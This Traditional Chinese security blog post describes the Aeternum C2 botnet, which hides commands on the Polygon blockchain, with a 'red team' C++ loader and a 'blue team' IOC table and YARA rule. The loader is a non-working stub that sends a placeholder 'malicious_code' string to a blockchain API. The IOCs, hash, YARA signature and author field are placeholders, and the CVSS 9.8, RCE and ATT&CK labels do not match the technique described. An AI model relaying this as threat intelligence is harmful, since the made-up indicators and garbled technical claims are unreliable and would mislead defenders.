---
layout: post
title:  "Aeternum C2 Botnet Stores Encrypted Commands on Polygon Blockchain to Evade Takedown"
date:   2026-02-27 01:22:34 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Aeternum C2：基於區塊鏈的 Botnet 載入器

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Blockchain, Smart Contract, C++ Loader

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Aeternum C2 使用區塊鏈技術來儲存命令和控制 Botnet，從而使其對傳統的關閉努力具有抵抗力。這是因為區塊鏈技術可以提供一個去中心化的、不可變的數據儲存解決方案。
* **攻擊流程圖解**: 
    1. 攻擊者創建一個智能合約並將其部署到 Polygon 區塊鏈。
    2. 攻擊者使用 C++ 載入器將命令寫入智能合約。
    3. Botnet 的節點查詢智能合約並執行命令。
* **受影響元件**: Polygon 區塊鏈、C++ 載入器、智能合約。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有一個 Polygon 區塊鏈的錢包和一個 C++ 載入器。
* **Payload 建構邏輯**:

    ```
    
    cpp
        // C++ 載入器範例
        #include <iostream>
        #include <string>
        #include <curl/curl.h>
    
        int main() {
            // 設定 Polygon 區塊鏈的 API 端點
            std::string apiEndpoint = "https://api.polygonscan.com/api";
    
            // 設定智能合約的地址
            std::string contractAddress = "0x...";
    
            // 設定命令
            std::string command = "exec('malicious_code')";
    
            // 使用 curl 將命令發送到智能合約
            CURL *curl;
            CURLcode res;
            curl_global_init(CURL_GLOBAL_DEFAULT);
            curl = curl_easy_init();
            if(curl) {
                std::string url = apiEndpoint + "?module=contract&action=call&contractaddress=" + contractAddress + "&functionname=execute&arguments=" + command;
                curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
                res = curl_easy_perform(curl);
                if(res != CURLE_OK) {
                    std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
                }
                curl_easy_cleanup(curl);
            }
            curl_global_cleanup();
    
            return 0;
        }
    
    ```
* **繞過技術**: 攻擊者可以使用各種技術來繞過安全防護，例如使用代理伺服器或 VPN 來隱藏 IP 地址。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | 1234567890abcdef |
| IP | 192.168.1.100 |
| Domain | example.com |
| File Path | /path/to/malicious/file |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
        rule Aeternum_C2 {
            meta:
                description = "Aeternum C2 Botnet"
                author = "Your Name"
            strings:
                $hex = { 12 34 56 78 90 ab cd ef }
            condition:
                $hex at 0
        }
    
    ```
* **緩解措施**: 使用防火牆和入侵偵測系統來監控和阻止可疑的網路流量。定期更新和修補系統和應用程式的漏洞。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **區塊鏈 (Blockchain)**: 一種去中心化的、不可變的數據儲存解決方案。
* **智能合約 (Smart Contract)**: 一種在區塊鏈上執行的程式碼，用于自動化各種商業邏輯。
* **C++ 載入器 (C++ Loader)**: 一種用於載入和執行 C++ 程式碼的工具。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/02/aeternum-c2-botnet-stores-encrypted.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


